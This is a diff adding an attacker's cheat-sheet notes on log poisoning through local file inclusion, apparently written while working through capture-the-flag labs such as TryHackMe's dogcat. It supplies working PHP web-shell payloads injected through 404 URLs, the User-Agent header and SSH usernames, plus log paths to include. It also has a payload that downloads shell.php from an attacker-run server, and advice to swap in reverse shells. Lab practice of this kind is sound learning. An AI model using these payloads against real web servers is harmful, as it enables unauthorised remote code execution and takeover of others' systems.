@@ -1,0 +1,46 @@
+1.) error.log
+	- paths you can find it at
+		- /var/log/apache2/error.log
+		- /var/log/apache/error.log
+		- /var/log/nginx/error.log
+	- ways to exploit it
+		- go to a page that doesnt exist and include:
+			- <?PHP echo system($_GET['pbot'])?>
+			- example: http:(boxip or hostname)/<?PHP echo system($_GET['pbot'])?>
+			- from there add the path to error.log and append &pbot=whoami
+			- example: http://(box ip or hostname)/privacy.php?file=/var/log/apache2/error.log&pbot=whoami
+			- can throw in a reverse shell replacing the whoami parameter
+			- might have to url encode or use escape characters '," the reverse shell
+2.) access.log
+	- paths you can find it at
+		- /var/log/apache2/access.log
+		- /var/log/apache/access.log
+		- /var/log/nginx/access.log
+	- ways to exploit it
+		- intercept the request with burp and insert <?PHP echo system($_GET['pbot'])?> into the user-agent field in burp
+		- from there append &pbot=whoami (any command you want) to the end of the access.log path
+		- example: http://(box ip or hostname)/privacy.php?f=/var/log/nginx/access.log&pbot=whoami
+		- can replace whoami with a reverse shell command
+		- in dogcat on tryhackme I had to something different here
+			- setup a python server
+			- intercept the request with burp and add this to the user agent
+			- <?php file_put_contents('shell.php', file_get_contents('http://10.2.53.76/shell.php'))?>
+			- make sure that you have shell.php in the directory you are hosting the shell.php file 
+			- in the burp request as well make sure that you are keeping the dirst part that includes the mozilla firefox part and getting rid of everything else that is after it and 
+			  replacing that with the <?php?> code above.
+			- now access this file by going to the webpage
+				- in this case http://10.10.99.75/shell.php
+			- before that though make sure that you got the request in you python server!!!
+				
+
+3.) ssh log poisoning	
+	- normal path for this
+		- /var/log/auth.log
+	- from there try to login with <?PHP echo system($_GET['pbot'])?>
+	- example: ssh <?PHP echo system($_GET['pbot'])?>@(target box ip)
+		- so ssh <?PHP echo system($_GET['pbot'])?>@10.10.10.128
+		- this will create a log that that user tried to login and append it the log file 
+		- by doing this we can now go to the log webpage and append &pbot=whoami to the end of the file path
+		- example: http://(target box ip or hostname)/?view=/var/log/auth.log&pbot=whoami
+4.) nginx log poisoning
+	- can be seen in error.log and access.log lfi exploitation above!!!!
